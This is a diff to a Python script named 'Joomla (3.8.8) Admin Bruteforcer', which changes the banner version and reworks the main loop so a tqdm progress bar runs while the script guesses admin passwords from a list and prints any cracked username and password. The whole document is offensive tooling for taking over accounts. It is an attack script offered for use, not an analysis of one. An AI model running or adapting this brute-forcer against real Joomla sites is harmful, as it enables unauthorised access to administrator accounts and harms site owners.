@@ -11,7 +11,7 @@
 # -*- coding: utf-8 -*-
 #
 # Joomla (3.8.8) Admin Bruteforcer
-# Modified by x7331: Python3 + Progress Bar + Simplified single-threaded run
+# Modified by x7331: Python3 + Progress Bar + Simplified single-threaded run + tqdm.write fix
 # Original Author: Fabrizio Siciliano (@0rbz_)
 #
 
@@ -33,7 +33,7 @@ print('''
   ·██▪     ▪     ·██ ▐███▪▐█ ▀█▪▀▄ █·█▪██▌•██  ▀▄.▀·
 ▪▄ ██ ▄█▀▄  ▄█▀▄ ▐█ ▌▐▌▐█·▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▐▀▀▪▄
 ▐▌▐█▌▐█▌.▐▌▐█▌.▐▌██ ██▌▐█▌██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█▄▄▌
- ▀▀▀• ▀█▄▀▪ ▀█▄▀▪▀▀  █▪▀▀▀·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀ v.2.6
+ ▀▀▀• ▀█▄▀▪ ▀█▄▀▪▀▀  █▪▀▀▀·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀ v.2.7
          Author: Fabrizio Siciliano (@0rbz_)
          Python3 + Progress Bar by x7331 (single-threaded)
 ''')
@@ -73,13 +73,15 @@ def try_login(password):
         return False
 
 def main():
-    for pwd in tqdm(passwords, desc="Bruteforcing", ncols=70, bar_format="{desc} {percentage:3.0f}%|{bar}| {n_fmt}/{total_fmt}"):
-        if try_login(pwd):
-            print(f"\n[!] Cracked: {args.username} : {pwd}")
-            return
-        if args.delay > 0:
-            time.sleep(args.delay)
-    print("\n[-] No valid credentials found.")
+    with tqdm(passwords, desc="Bruteforcing", ncols=70, bar_format="{desc} {percentage:3.0f}%|{bar}| {n_fmt}/{total_fmt}") as pbar:
+        for pwd in pbar:
+            if try_login(pwd):
+                pbar.close()
+                tqdm.write(f"[!] Cracked: {args.username} : {pwd}")
+                return
+            if args.delay > 0:
+                time.sleep(args.delay)
+    tqdm.write("[-] No valid credentials found.")
 
 if __name__ == "__main__":
     main()
